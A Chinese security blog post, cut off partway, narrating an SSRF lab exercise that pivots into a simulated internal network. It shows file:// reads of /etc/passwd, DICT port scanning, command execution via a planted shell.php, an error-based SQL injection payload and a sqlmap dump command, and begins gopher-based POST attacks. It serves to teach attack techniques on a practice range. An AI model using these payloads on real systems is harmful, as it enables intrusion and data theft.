---
title: 实战 | 记一次SSRF靶场到内网打穿
url: https://www.secpulse.com/archives/191048.html
source: 安全脉搏
date: 2022-11-16
fetch_date: 2025-10-03T22:51:47.446668
---

# 实战 | 记一次SSRF靶场到内网打穿

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 实战 | 记一次SSRF靶场到内网打穿

[内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)

[HACK\_Learn](https://www.secpulse.com/newpage/author?author_id=8971)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)

2022-11-15

22,065

## **0x0前言**

靶场网络拓扑如下

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191048-1668500802.png "92883-rn4n90qpxcd.png")

92883-rn4n90qpxcd.png

172.172.0.10 这个服务器的 Web 80 端口存在 SSRF 漏洞，并且 80 端口映射到了公网，此时攻击者通过公网可以借助 SSRF 漏洞发起对 172 目标内网的探测和攻击。

大部分源码采用自国光师傅的项目,修改了一两个靶机的内容

```
https://github.com/sqlsec/ssrf-vuls
```

‍

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191048-1668500806.png)

## **0x01 判断 SSRF并获取信息**

SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档，等等。
下面这个功能点是获取网站快照

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191048-1668500807.png "69614-tndfk5ot85f.png")

69614-tndfk5ot85f.png

正常业务情况是请求网站然后响应内容，但是没做好过滤可以使用其他协议，配合 file 协议来读取本地的文件信息，首先尝试使用 file 协议来读取 /etc/passwd 文件试试看：

```
file:///etc/passwd
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191048-1668500808.png "78756-9er4vpqham8.png")

78756-9er4vpqham8.png

然后Linux的话可以通过读取/etc/hosts来获取当前主机的ip

```
file:///etc/hosts
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191048-1668500809.png "66142-h369bp33i2e.png")

66142-h369bp33i2e.png

得到当前的主机ip为172.172.0.10 权限高的情况下还可以尝试读取 /proc/net/arp 或者 /etc/network/interfaces 来判断当前机器的网络情况

## **0x01 172.1720.1/24 - SSRF 探测内网端口**

SSRF 常配合 DICT 协议探测内网端口开放情况，但不是所有的端口都可以被探测，一般只能探测出一些带 TCP 回显的端口
burp爆破模块对ip c段跟端口进行选择然后攻击模式选择Cluster bomb

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191048-1668500810.png "40044-fzx69x100xv.png")

40044-fzx69x100xv.png

第一个位置选择1到255也就是一个c段

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191048-1668500811.png "42286-43y621vg8r.png")

42286-43y621vg8r.png

第二个是要探测的端口

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191048-1668500812.png)

88273-cc5dvx1sk0c.png

得到的端口开放信息

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191048-1668500813.png)

25681-yrvg1nsgibb.png

通过爆破可以得到端口的开放情况(开放的可能更多，上帝视角列出能打的)：

```
172.172.0.15 6379172.172.0.2 6379 172.172.0.18 3306172.172.0.59 80,3306172.172.0.25 80172.172.0.50 80172.172.0.10 80
```

## **0x02 172.172.0.50代码注入**

通过ssrf先请求一下发现了一个首页显示Hello CodeExec

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191048-1668500814.png)

74825-n6nl3eynt1.png

对这个进行SSRF目录扫描

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191048-1668500815.png)

54154-mqsyiz1cr5.png

然后添加目录字典

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191048-1668500816.png)

55186-b57nh5olwi.png

通过长度可以可以看出来存在着 phpinfo.php 和 shell.php：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191048-1668500818.png)

44623-t42ox9y424h.png

访问一下shell.php一个简单的命令执行

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191048-1668500822.png)

42177-xf9nzxrau3h.png

直接使用 SSRF 的 HTTP 协议来发起 GET 请求，直接给 cmd 参数传入命令值，来命令直接执行：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191048-1668500824.png)

37588-c1zudcbtp5s.png

查看一下这台的hosts文件

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191048-1668500826.png)

47658-xyvw28zk1b.png

## **0x03 172.172.0.59Sql注入**

请求页面发现是一个查询的功能点

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191048-1668500827.png)

98531-0msr985bbi3.png

通过查看html表单可以发现是通过get传给当前文件的参数是username

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191048-1668500828.png)

89536-z04l3rab9wf.png

查询一下admin

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191048-1668500829.png)

37612-3jcg64kw8ei.png

加个单引号发现报错了

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191048-16685008291.png)

00578-le5kefz9cr.png

存在报错我们直接构造报错注入payload

```
172.172.0.59?username=admin'-updatexml(1,concat(0x7e,user()),1)-'
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191048-1668500830.png)

33263-471qxtwucgg.png

使用sqlmap

```
sqlmap -u "http://10.68.1.51/" --data "url="  --prefix "172.172.0.59?username=admin'" --dbms mysql -p url --tech E -v 3 --level 3 --tamper space2comment   -D "user" --dump
```

成功跑出注入

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191048-1668500832.png)

58166-zw7wz83qjns.png

## **0x04 172.172.0.25 uploadfile**

发现是一个头像上传的功能点

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191048-1668500836.png)

17762-ddqf8o19f7p.png

查看表单可以看到上传到当前文件，文件名是file

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-191048-1668500837.png)

70735-zgfaighntf.png

上传是通过 POST ，我们无法使用使用 SSRF 漏洞通过 HTTP 协议来传递 POST 数据，这种情况下一般就得利用 gopher 协议来发起对内网应用的 POST 请求了，gopher 的基本请求格式如下：

```
gopher://IP:port/_{TCP/IP数据流}
```

gopher 协议是一个古老且强大的协议，从请求格式可以看出来，可以传递最底层的 TCP 数据流，因为 HTTP 协议也是属于 TCP 数据层的，所以通过 gopher 协议传递 HTTP 的 POST 请求也是轻而易举的。
首先来抓取正常情况下 POST 请求的数据包，删除掉 HTTP 请求的这一行如果不删除的话，打出的 SSRF 请求会乱码，因为被两次 gzip 编码了。

```
Acce...